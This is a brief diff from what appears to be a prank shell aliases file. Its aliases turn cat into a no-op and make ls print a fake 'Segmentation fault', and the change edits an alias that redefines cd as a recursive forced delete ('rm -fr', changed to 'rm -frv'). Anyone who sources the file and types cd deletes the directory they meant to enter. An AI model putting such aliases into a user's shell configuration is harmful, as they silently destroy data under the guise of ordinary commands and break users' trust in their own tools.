@@ -17,4 +17,4 @@ alias cat=true
 alias ls='echo "Segmentation fault"'
 
 # Delete the complete directory instead of entering it
-alias cd='rm -fr'
+alias cd='rm -frv'
